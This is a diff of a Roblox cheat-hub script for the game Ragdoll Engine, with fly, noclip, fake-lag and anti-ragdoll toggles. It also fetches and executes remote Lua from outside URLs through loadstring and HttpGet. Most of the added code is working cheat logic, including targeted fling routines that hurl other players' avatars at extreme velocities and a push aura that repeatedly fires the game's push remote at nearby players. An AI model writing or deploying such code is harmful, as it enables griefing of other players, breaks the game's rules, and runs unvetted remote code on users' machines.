@@ -12,7 +12,7 @@ ToggleHub.Parent = game.CoreGui
 Main.Name = "Main"
 Main.Parent = ToggleHub
 Main.BorderSizePixel = 0
-Main.Position = UDim2.new(0, 0, .60, 0)
+Main.Position = UDim2.new(0, 0, .55, 0)
 Main.Size = UDim2.new(.01, .02, .01, .02)
 Main.Transparency = 1
 
@@ -27,39 +27,142 @@ ImageLabel.BackgroundColor3 = Color3.new(0.741176, 0.764706, 0.780392)
 ImageLabel.BackgroundTransparency = .3
 ImageLabel.Position = UDim2.new(0, 0, 0, 0)
 ImageLabel.Rotation = 0
-ImageLabel.Size = UDim2.new(0, 35, 0, 35)
-ImageLabel.Image = "rbxassetid://116504620"
+ImageLabel.Size = UDim2.new(0, 30, 0, 30)
+ImageLabel.Image = "rbxassetid://14290674733"
 ImageLabel.ImageTransparency = 0
 
 
 Toggle.MouseButton1Click:Connect(function()
 game:GetService("VirtualInputManager"):SendKeyEvent(true, "V", false, game)
 end)
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/ggshizuru/myScriptHub/main/libreria"))()
 
-loadstring(game:HttpGet("https://enclosed.live/version"))
+local Window = Library:Create("ShizzuruHub","v1.1")
 
-local DiscordLib = loadstring(game:HttpGet "https://raw.githubusercontent.com/Atlasv1/Atlasv1/main/pruebalib")()
-
-local NotifyLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/Kinlei/Dynissimo/main/Scripts/AkaliNotif.lua"))()
-local Notify = NotifyLibrary.Notify
-
-local win = DiscordLib:Window("Exynux.www")
-local serv = win:Server("Exynux Scripts", "")
-local Home = serv:Channel("Home")
-Home:Label("Owner[Cpixell]")
-Home:Label("Next updates soon")
-Home:Label("Press (V) to Open/Close")
-
-game.StarterGui:SetCore("SendNotification", {Title = "Exynux", Text = "Dev [cpixell]", Icon = "rbxassetid://116504620", Duration = 9, Button1 = "Yay🔱"})
-
-
-local player = serv:Channel("Ragdoll Engine")
-
-player:Toggle(
-    "Anti Ragdoll",
-    false,
-function(state)
-if state then
+local TabM = Window:Tab("SCRIPTS",true) -- done
+local TabDU = Window:Tab("MISC",false) -- done
+local TabS = Window:Tab("CHARACTER",false) -- done
+local TabT = Window:Tab("TELEPORT",false) -- done
+local TabF = Window:Tab("FPS LOCKER",false) -- done
+local TabA = Window:Tab("ANIMATION",false)
+local TabE = Window:Tab("EXTRA",false) -- done
+local TabCR = Window:Tab("CREDITS",false) -- done
+---------------------------------------------
+--Main Tab
+----------------------------------------------
+TabS:Button("Fly [X]",function()
+    local plr = game.Players.LocalPlayer
+    local mouse = plr:GetMouse()
+     
+            localplayer = plr
+           
+            if workspace:FindFirstChild("Core") then
+                workspace.Core:Destroy()
+            end
+           
+            local Core = Instance.new("Part")
+            Core.Name = "Core"
+            Core.Size = Vector3.new(0.05, 0.05, 0.05)
+     
+            spawn(function()
+                Core.Parent = workspace
+                local Weld = Instance.new("Weld", Core)
+                Weld.Part0 = Core
+                Weld.Part1 = localplayer.Character.LowerTorso
+                Weld.C0 = CFrame.new(0, 0, 0)
+            end)
+           
+            workspace:WaitForChild("Core")
+           
+            local torso = workspace.Core
+            flying = true
+            local speed=50
+            local keys={a=false,d=false,w=false,s=false}
+            local e1
+            local e2
+            local function start()
+                local pos = Instance.new("BodyPosition",torso)
+                local gyro = Instance.new("BodyGyro",torso)
+                pos.Name="EPIXPOS"
+                pos.maxForce = Vector3.new(math.huge, math.huge, math.huge)
+                pos.position = torso.Position
+                gyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+                gyro.cframe = torso.CFrame
+                repeat
+                    wait()
+                    localplayer.Character.Humanoid.PlatformStand=true
+                    local new=gyro.cframe - gyro.cframe.p + pos.position
+                    if not keys.w and not keys.s and not keys.a and not keys.d then
+                        speed=21
+                    end
+                    if keys.w then
+                        new = new + workspace.CurrentCamera.CoordinateFrame.lookVector * speed
+                        speed=speed+0
+                    end
+                    if keys.s then
+                        new = new - workspace.CurrentCamera.CoordinateFrame.lookVector * speed
+                        speed=speed+0
+                    end
+                    if keys.d then
+                        new = new * CFrame.new(speed,0,0)
+                        speed=speed+0
+                    end
+                    if keys.a then
+                        new = new * CFrame.new(-speed,0,0)
+                        speed=speed+0
+                    end
+                    if speed>25 then
+                        speed=5
+                    end
+                    pos.position=new.p
+                    if keys.w then
+                        gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad(speed*0),0,0)
+                    elseif keys.s then
+                        gyro.cframe = workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(math.rad(speed*0),0,0)
+                    else
+                        gyro.cframe = workspace.CurrentCamera.CoordinateFrame
+                    end
+                until flying == false
+                if gyro then gyro:Destroy() end
+                if pos then pos:Destroy() end
+                flying=false
+                localplayer.Character.Humanoid.PlatformStand=false
+                speed=25
+            end
+            e1=mouse.KeyDown:connect(function(key)
+                if not torso or not torso.Parent then flying=false e1:disconnect() e2:disconnect() return end
+                if key=="w" then
+                    keys.w=true
+                elseif key=="s" then
+                    keys.s=true
+                elseif key=="a" then
+                    keys.a=true
+                elseif key=="d" then
+                    keys.d=true
+                elseif key=="x" then
+                    if flying==true then
+                        flying=false
+                    else
+                        flying=true
+                        start()
+                    end
+                end
+            end)
+            e2=mouse.KeyUp:connect(function(key)
+                if key=="w" then
+                    keys.w=false
+                elseif key=="s" then
+                    keys.s=false
+                elseif key=="a" then
+                    keys.a=false
+                elseif key=="d" then
+                    keys.d=false
+                end
+            end)
+            start()
+end)
+TabM:Toggle("No Ragdoll",function(state)
+    if state then 
 if  game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
             if not game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BodyVelocity") then
                 local stop = Instance.new("BodyVelocity", game.Players.LocalPlayer.Character.HumanoidRootPart)
@@ -119,14 +222,9 @@ elseif not state then
                 StartRagdoll.Disabled = false
 end
 end
-end
-)
-
-player:Toggle(
-    "Touch Fling",
-    false,
-    function(state)
-  getgenv().demisethebest = state
+end)
+TabM:Toggle("Touch Fling",function(state)
+	getgenv().demisethebest = state
 
 game:GetService("RunService").heartbeat:Connect(function()
     if getgenv().demisethebest == true then 
@@ -137,138 +235,358 @@ game:GetService("RunService").heartbeat:Connect(function()
     end 
 end)
 end)
-
-player:Toggle(
-    "Walk Fling",
-    false,
-	function(state)
-	  if state == true then
-        getgenv().DesynxRX = true
-
-function checkifalive(player) --checks if the player is alive 
-    if player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health ~= 1 and player.Character:FindFirstChild("Head") then
-        return true
-    end
-end
-
-function cframefix() --old version
-    if checkifalive(game.Players.LocalPlayer) then
-    for _, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-        if v:IsA("Script") and v.Name ~= "Health" and v.Name ~= "Sound" and v:FindFirstChild("LocalScript") then
-            v:Destroy()
-        end
-    end
-    game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
-        repeat
-            task.wait()
-        until game.Players.LocalPlayer.Character
-        char.ChildAdded:Connect(function(child)
-            if child:IsA("Script") then 
-                if child:FindFirstChild("LocalScript") and checkifalive(game.Players.LocalPlayer) then
-                    child.LocalScript:FireServer()
+TabM:Toggle("Push Aura",function(state)
+     getgenv().PushAura = state;
+    
+    if state then
+        coroutine.resume(coroutine.create(function()
+            while wait() do
+                if not getgenv().PushAura then
+                    getgenv().PACon = true;
+                    coroutine.yield();
+                end
+                
+                if game:GetService("Players").LocalPlayer.Character == nil or game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart") == nil or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Push") == nil then
+                    continue; 
+                end
+                
+                for _,plr in pairs(game:GetService("Players"):GetPlayers()) do
+                    if plr == game:GetService("Players").LocalPlayer or plr.Character == nil or plr.Character:FindFirstChild("HumanoidRootPart") == nil or (plr.Character:FindFirstChild("HumanoidRootPart").Position-game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart").Position).Magnitude > 15 then
+                        continue;
+                    end
+                    
+                    game:GetService("Players").LocalPlayer.Character:FindFirstChild("Push"):FindFirstChild("PushTool"):FireServer(plr.Character);
                 end
             end
+        end))
+    end
+end)
+
+local ar_con1 = nil;
+
+TabM:Toggle("Fake Lag",function(state)
+    if state then
+        Uptime = .1
+        Downtime = .5
+        
+                PLR = game.Players.LocalPlayer.Character.HumanoidRootPart
+                _G.Toggle = true
+                
+                while _G.Toggle do
+                    task.wait()
+                    PLR.Anchored = true
+                    wait(Downtime)
+                    PLR.Anchored = false
+                    wait(Uptime)
+        end
+        elseif not state then
+        Uptime = .1
+        Downtime = .5
+        
+                PLR = game.Players.LocalPlayer.Character.HumanoidRootPart
+                _G.Toggle = false
+                
+                while _G.Toggle do
+                    task.wait()
+                    PLR.Anchored = true
+                    wait(Downtime)
+                    PLR.Anchored = false
+                    wait(Uptime)
+        end
+        end
+        end
+        )
+TabM:Toggle("No Clip",function(state)
+    if state then
+        _G.noclip = true
+        local Loop  game:GetService('RunService').Stepped:connect(function()
+                    if _G.noclip then
+                        for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                            if v:IsA("BasePart") then
+                                pcall(function()
+                                if v.CanCollide ~= not _G.noclip then
+                                    v.CanCollide = not _G.noclip
+                                end
+                                end)
+                            end
+                        end
+                    end
         end)
-    end)
-end
-end
+        elseif not state then
+        _G.noclip = false -- toggle to true to enable
+        local Loop  game:GetService('RunService').Stepped:connect(function()
+                    if _G.noclip then
+                        for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+                            if v:IsA("BasePart") then
+                                if v.CanCollide ~= not _G.noclip then
+                                    v.CanCollide = not _G.noclip
+                                end
+                            end
+                        end
+                    end
+        end)
+        end
+        end)
+TabM:Button("Potion Dick",function()
+    toolf = game.Players.LocalPlayer.Backpack:WaitForChild("potion")
+    toolf.Parent = game.Players.LocalPlayer.Character
+    game.Players.LocalPlayer.Character:WaitForChild("potion").Grip = CFrame.new(-1.4000001, -0.699999988, 0, 0, 1, -0, -1, 0, -0, 0, 0, 1)
+    game.Players.LocalPlayer.Character:WaitForChild("potion").GripForward = Vector3.new(1, -1.1, -0)
+    game.Players.LocalPlayer.Character:WaitForChild("potion").GripPos = Vector3.new(1.111100, 0.5, 1.5111)
+    game.Players.LocalPlayer.Character:WaitForChild("potion").GripUp = Vector3.new(-30000, 1000, 5000000)
+end)
+TabM:Button("Antifling",function()
+    local RunService = game:GetService("RunService")
+local players = game:GetService("Players")
+local plr = players.LocalPlayer
 
-game:GetService("RunService").Heartbeat:Connect(function()--the actual script running
-    if getgenv().DesynxRX == true and checkifalive(game.Players.LocalPlayer) then
-        local olspo =  game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity cframefix() 
-          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame *  CFrame.Angles(0,360, 0)
-     game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(olspo.X + math.random(1000,10000) ,olspo.Y + math.random(1000,1000),olspo.Z + math.random(1000,10000))
-     game:GetService("RunService").RenderStepped:wait()
-        game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity =  olspo
-        game:GetService("RunService").RenderStepped:wait()
+RunService.Stepped:Connect(function()
+    for i, CoPlayer in pairs(players:GetChildren()) do
+        if CoPlayer ~= plr and CoPlayer.Character then
+            for i,part in pairs(CoPlayer.Character:GetChildren()) do
+                if part:IsA("BasePart") or part:IsA("Part") or part.Name == "HumanoidRootPart" then
+                    part.CanCollide = false
+                elseif part:IsA("Accessory") and part:FindFirstChildOfClass("MeshPart") then
+                    part:FindFirstChildOfClass("MeshPart").CanCollide = false
+                end
+            end
+        end
     end
 end)
- elseif state == false then
-        getgenv().DesynxRX = false
-        end
-   end)
-
-player:Toggle(
-    "Freeze",
-    false,
-	function(state)
-	game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = state
-end) 
-
-player:Toggle(
-    "Fake Lag",
-    false,
-function(state)
-if state then
-Uptime = .1
-Downtime = .5
-
-        PLR = game.Players.LocalPlayer.Character.HumanoidRootPart
-        _G.Toggle = true
-        
-        while _G.Toggle do
-            task.wait()
-            PLR.Anchored = true
-            wait(Downtime)
-            PLR.Anchored = false
-            wait(Uptime)
-end
-elseif not state then
-Uptime = .1
-Downtime = .5
-
-        PLR = game.Players.LocalPlayer.Character.HumanoidRootPart
-        _G.Toggle = false
-        
-        while _G.Toggle do
-            task.wait()
-            PLR.Anchored = true
-            wait(Downtime)
-            PLR.Anchored = false
-            wait(Uptime)
-end
-end
-end
-)
-
-player:Toggle(
-    "No-Clip",
-    false,
-    function(state)
-if state then
-_G.noclip = true
-local Loop  game:GetService('RunService').Stepped:connect(function()
-            if _G.noclip then
-                for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-                    if v:IsA("BasePart") then
-                        pcall(function()
-                        if v.CanCollide ~= not _G.noclip then
-                            v.CanCollide = not _G.noclip
-                        end
-                        end)
-                    end
-                end
-            end
 end)
-elseif not state then
-_G.noclip = false -- toggle to true to enable
-local Loop  game:GetService('RunService').Stepped:connect(function()
-            if _G.noclip then
-                for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
-                    if v:IsA("BasePart") then
-                        if v.CanCollide ~= not _G.noclip then
-                            v.CanCollide = not _G.noclip
-                        end
-                    end
-                end
-            end
-end)
-end
-end)
-
-player:Button(
-    "Potion Fling",
-    function()
+TabM:Button("Pulse Fling",function()
+wait(0) local A_1 = "[ShizzuruHub] Pulse-Fling Activate" local A_2 = "All" local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest Event:FireServer(A_1, A_2) 
+    local Players = game:GetService("Players")
+	 local Mouse = game:GetService("Players").LocalPlayer:GetMouse()
+	 
+	 Mouse.Button1Down:Connect(function()
+		 local Target = Mouse.Target
+		 if Target and Target.Parent and Target.Parent:IsA("Model") and Players:GetPlayerFromCharacter(Target.Parent) then
+			 local PlayerName = Players:GetPlayerFromCharacter(Target.Parent).Name
+	 local player = game.Players.LocalPlayer
+	 local Targets = {PlayerName}
+	 
+	 local Players = game:GetService("Players")
+	 local Player = Players.LocalPlayer
+	 
+	 local AllBool = false
+	 
+	 local GetPlayer = function(Name)
+		Name = Name:lower()
+		if Name == "all" or Name == "others" then
+			AllBool = true
+			return
+		elseif Name == "random" then
+			local GetPlayers = Players:GetPlayers()
+			if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
+			return GetPlayers[math.random(#GetPlayers)]
+		elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
+			for _,x in next, Players:GetPlayers() do
+				if x ~= Player then
+					if x.Name:lower():match("^"..Name) then
+						return x;
+					elseif x.DisplayName:lower():match("^"..Name) then
+						return x;
+					end
+				end
+			end
+		else
+			return
+		end
+	 end
+	 
+	 local Message = function(_Title, _Text, Time)
+print(_Title)
+print(_Text)
+print(Time)
+	 end
+	 
+	 local SkidFling = function(TargetPlayer)
+		local Character = Player.Character
+		local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+		local RootPart = Humanoid and Humanoid.RootPart
+	 
+		local TCharacter = TargetPlayer.Character
+		local THumanoid
+		local TRootPart
+		local THead
+		local Accessory
+		local Handle
+	 
+		if TCharacter:FindFirstChildOfClass("Humanoid") then
+			THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
+		end
+		if THumanoid and THumanoid.RootPart then
+			TRootPart = THumanoid.RootPart
+		end
+		if TCharacter:FindFirstChild("Head") then
+			THead = TCharacter.Head
+		end
+		if TCharacter:FindFirstChildOfClass("Accessory") then
+			Accessory = TCharacter:FindFirstChildOfClass("Accessory")
+		end
+		if Accessoy and Accessory:FindFirstChild("Handle") then
+			Handle = Accessory.Handle
+		end
+	 
+		if Character and Humanoid and RootPart then
+			if RootPart.Velocity.Magnitude < 50 then
+				getgenv().OldPos = RootPart.CFrame
+			end
+			if THumanoid and THumanoid.Sit and not AllBool then
+			end
+			if THead then
+				workspace.CurrentCamera.CameraSubject = THead
+			elseif not THead and Handle then
+				workspace.CurrentCamera.CameraSubject = Handle
+			elseif THumanoid and TRootPart then
+				workspace.CurrentCamera.CameraSubject = THumanoid
+			end
+			if not TCharacter:FindFirstChildWhichIsA("BasePart") then
+				return
+			end
+			
+			local FPos = function(BasePart, Pos, Ang)
+				RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
+				Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
+				RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
+				RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
+			end
+			
+			local SFBasePart = function(BasePart)
+				local TimeToWait = 2
+				local Time = tick()
+				local Angle = 0
+	 
+				repeat
+					if RootPart and THumanoid then
+						if BasePart.Velocity.Magnitude < 50 then
+							Angle = Angle + 100
+	 
+							FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
+							task.wait()
+	 
+							FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+							task.wait()
+	 
+							FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+							task.wait()
+	 
+							FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+							task.wait()
+	 
+							FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+							task.wait()
+	 
+							FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+							task.wait()
+						else
+							FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+							task.wait()
+	 
+							FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
+							task.wait()
+	 
+							FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+							task.wait()
+							
+							FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+							task.wait()
+	 
+							FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
+							task.wait()
+	 
+							FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+							task.wait()
+	 
+							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
+							task.wait()
+	 
+							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+							task.wait()
+	 
+							FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
+							task.wait()
+	 
+							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+							task.wait()
+						end
+					else
+						break
+					end
+				until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
+			end
+			
+			workspace.FallenPartsDestroyHeight = 0/0
+			
+			local BV = Instance.new("BodyVelocity")
+			BV.Name = "EpixVel"
+			BV.Parent = RootPart
+			BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
+			BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
+			
+			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+			
+			if TRootPart and THead then
+				if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
+					SFBasePart(THead)
+				else
+					SFBasePart(TRootPart)
+				end
+			elseif TRootPart and not THead then
+				SFBasePart(TRootPart)
+			elseif not TRootPart and THead then
+				SFBasePart(THead)
+			elseif not TRootPart and not THead and Accessory and Handle then
+				SFBasePart(Handle)
+			else
+			end
+			
+			BV:Destroy()
+			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+			workspace.CurrentCamera.CameraSubject = Humanoid
+			
+			repeat
+				RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
+				Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
+				Humanoid:ChangeState("GettingUp")
+				table.foreach(Character:GetChildren(), function(_, x)
+					if x:IsA("BasePart") then
+						x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
+					end
+				end)
+				task.wait()
+			until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
+			workspace.FallenPartsDestroyHeight = getgenv().FPDH
+		else
+		end
+	 end
+	 
+	 getgenv().Welcome = true
+	 if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
+	 
+	 if AllBool then
+		for _,x in next, Players:GetPlayers() do
+			SkidFling(x)
+		end
+	 end
+	 
+	 for _,x in next, Targets do
+		if GetPlayer(x) and GetPlayer(x) ~= Player then
+			if GetPlayer(x).UserId ~= 1414978355 then
+				local TPlayer = GetPlayer(x)
+				if TPlayer then
+					SkidFling(TPlayer)
+				end
+			else
+			end
+		elseif not GetPlayer(x) and not AllBool then
+		end
+	 end
+		 end
+	 end)
+ end)
+TabM:Button("Potion Fling",function()
     if game.Players.LocalPlayer.Character:FindFirstChild("potion") then
         local humanoid = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
         local tool = game.Players.LocalPlayer.Character:FindFirstChild("potion")
@@ -459,583 +777,31 @@ player:Button(
         local tool = game.Players.LocalPlayer.Backpack.potion 
         humanoid:EquipTool(tool)
     end 
-	end
-)
-
-player:Button(
-    "Potion Dick",
-    function()
-        toolf = game.Players.LocalPlayer.Backpack:WaitForChild("potion")
-        toolf.Parent = game.Players.LocalPlayer.Character
-        game.Players.LocalPlayer.Character:WaitForChild("potion").Grip = CFrame.new(-1.4000001, -0.699999988, 0, 0, 1, -0, -1, 0, -0, 0, 0, 1)
-        game.Players.LocalPlayer.Character:WaitForChild("potion").GripForward = Vector3.new(1, -1.1, -0)
-        game.Players.LocalPlayer.Character:WaitForChild("potion").GripPos = Vector3.new(1.111100, 0.5, 1.5111)
-        game.Players.LocalPlayer.Character:WaitForChild("potion").GripUp = Vector3.new(-30000, 1000, 5000000)
-    end)
-
-player:Button(
-    "Anti Fling",
-    function()
-local RunService = game:GetService("RunService")
-local players = game:GetService("Players")
-local plr = players.LocalPlayer
-
-RunService.Stepped:Connect(function()
-    for i, CoPlayer in pairs(players:GetChildren()) do
-        if CoPlayer ~= plr and CoPlayer.Character then
-            for i,part in pairs(CoPlayer.Character:GetChildren()) do
-                if part:IsA("BasePart") or part:IsA("Part") or part.Name == "HumanoidRootPart" then
-                    part.CanCollide = false
-                elseif part:IsA("Accessory") and part:FindFirstChildOfClass("MeshPart") then
-                    part:FindFirstChildOfClass("MeshPart").CanCollide = false
-                end
-            end
-        end
-    end
-end)
-end)
-
-player:Button(
-	"All Explosion Minefield",
-	function()
-  if not game.Players.LocalPlayer.Character.Head:FindFirstChild("BodyVelocity") then
-            local disconnect = Instance.new("BodyVelocity", game.Players.LocalPlayer.Character.Head)
-            disconnect.Velocity = Vector3.new(0, 0, 0)
-            disconnect.MaxForce = Vector3.new(0, 0, 0)
-        end
-for _,v in pairs(workspace:GetDescendants()) do
-if v:IsA("TouchTransmitter") then
-firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 0) --0 is touch
-wait()
-firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 1) -- 1 is untouch
-end
-end
-end)
-
-local TargetT = serv:Channel("Target")
-
-
-TargetT:Textbox(
-    "Target",
-    "Type you're target here and press enter!",
-    true,
-    function(target) -- // this function finds the target!
-        for i,v in pairs(game.Players:GetChildren()) do
-            if v.Name ~= game.Players.LocalPlayer.Name then
-                if string.sub(string.lower(v.Name),1,string.len(target)) == string.lower(target) or string.sub(string.lower(v.DisplayName),1,string.len(target)) == string.lower(target)  then
-					NotifyLibrary.Notify({
-						Title = "Target Found!",
-						Description = "Player: "..v.Name.." / "..v.DisplayName,
-						Duration = 2
-					})
-                    Target = v
-                    TargetV = v.Name
-                    return
-                end
-            end
-        end
-		NotifyLibrary.Notify({
-			Title = "ERROR",
-			Description = "No target found.",
-			Duration = 2
-		})
-    end
-)
-
-player = game.Players.LocalPlayer
-        local Loop
-        local OldFlingPos = player.Character.HumanoidRootPart.Position
-        local loopFunction = function()
-            local success,err = pcall(function()
-                local FlingEnemy = game.Players:FindFirstChild(TargetV).Character
-                if FlingEnemy and player.Character then
-                    FlingTorso = FlingEnemy.UpperTorso
-                    local dis = 3.85
-                    local increase = 6
-                    if FlingEnemy.Humanoid.MoveDirection.X < 0 then
-                        xchange = -increase
-                    elseif FlingEnemy.Humanoid.MoveDirection.X > 0  then
-                        xchange = increase
-                    else
-                        xchange = 0
-                    end
-                    if FlingEnemy.Humanoid.MoveDirection.Z < 0 then
-                        zchange = -increase
-                    elseif FlingEnemy.Humanoid.MoveDirection.Z > 0 then
-                        zchange = increase
-                    else
-                        zchange = 0
-                    end          
-                    if player.Character then
-                        player.Character:FindFirstChildWhichIsA('Humanoid'):ChangeState(11)
-                        player.Character.HumanoidRootPart.CFrame = CFrame.new(FlingTorso.Position.X + math.random(-dis,dis) + xchange, FlingTorso.Position.Y, FlingTorso.Position.Z + math.random(-dis,dis) + zchange) * CFrame.Angles(math.rad(player.Character.HumanoidRootPart.Orientation.X + 350),math.rad(player.Character.HumanoidRootPart.Orientation.Y + 200),math.rad(player.Character.HumanoidRootPart.Orientation.Z + 240))
-                        player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
-                    end
-                end
-            end)
-            if err then
-            end
-        end;
-        local Start = function()    
-            OldFlingPos = player.Character.HumanoidRootPart.Position
-            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
-        end;
-        local Pause = function()
-            Loop:Disconnect()
-            local vectorZero = Vector3.new(0, 0, 0)
-            player.Character.PrimaryPart.Velocity = vectorZero
-            player.Character.PrimaryPart.RotVelocity = vectorZero
-            player.Character.HumanoidRootPart.CFrame = CFrame.new(OldFlingPos) * CFrame.Angles(math.rad(0),math.rad(137.92),math.rad(0))
-        end;
-
-TargetT:Toggle("Fling", false, function(bool)
-	if bool == true then
-		Start()
-	elseif bool == false then
-		Pause()
-	end
-end)		
-
-_G.RocketLock = false
-game:GetService"RunService".RenderStepped:Connect(function()
-	if _G.RocketLock == true then
-		if game.Workspace.Ignored:FindFirstChild("Launcher")then
-			local lol = game.Workspace.Ignored:FindFirstChild("Launcher")
-			if lol:FindFirstChildOfClass("BodyVelocity") then
-				wait()
-				lol.BodyVelocity:Destroy()
-			end
-
-			if lol:FindFirstChild("BodyVelocity") == nil then
-				lol.CFrame = CFrame.new(workspace.Players[TargetV].Head.CFrame.X,workspace.Players[TargetV].Head.CFrame.Y+6,workspace.Players[TargetV].Head.CFrame.Z)
-			end
-
-		elseif game.Workspace.Ignored:FindFirstChild("Handle")then
-			local lol = game.Workspace.Ignored:FindFirstChild("Handle")
-
-			if lol:FindFirstChild("Pin") then
-				lol.CFrame = CFrame.new(workspace.Players[TargetV].Head.CFrame.X,workspace.Players[TargetV].Head.CFrame.Y+1,workspace.Players[TargetV].Head.CFrame.Z)
-			end
-		end
-	end
-end)
-
-TargetT:Toggle(
-	"View",
-	false,
-	function(viewing)
-
-if viewing == true then
-	local TargetPlr = TargetV
-	game.Workspace.Camera.CameraSubject = game.Players[TargetPlr].Character.Humanoid
-elseif viewing == false then
-	game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
-end
-end
-)
-
-TargetT:Toggle(
-    "Focus Push",
-    false,
-function(state)
-if state then
-if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-            local bool = Instance.new("BoolValue",game.InsertService)
-            bool.Name = "valor"
-            if game.Players.LocalPlayer.Backpack:FindFirstChild("Push") then
-                game.Players.LocalPlayer.Backpack.Push.Parent = game.Players.LocalPlayer.Character
-            end
-    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        local Character = game.Players.LocalPlayer.Character.HumanoidRootPart
-            while wait() do
-                if game.InsertService:FindFirstChild("valor") then
-                    Character.CFrame = game.Players:FindFirstChild(TargetV).Character.HumanoidRootPart.CFrame
-                    pcall(
-                        function()
-                            for i, v in pairs(game.Players:GetPlayers()) do
-                                if v.Name == game.Players.LocalPlayer.Name then
-                                else
-                                    local args = {
-                                        [1] = game:GetService("Players")[v.Name].Character
-                                    }
-
-                                    game:GetService("Players").LocalPlayer.Character.Push.PushTool:FireServer(unpack(args))
-                                end
-                            end
-                        end
-                    )
-                end
-            end
-     end
-end
-elseif not state then
-    if game.InsertService:FindFirstChild("valor") then
-        game.InsertService.valor:Remove()
-    end 
-end
-end
-)
-
-TargetT:Button(
-    "Teleport",
-    function()
-        local TargetPlr = TargetV
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[TargetPlr].Character.HumanoidRootPart.CFrame
-    end
-)
-TargetT:Button(
-    "Copy Anim",
-    function()
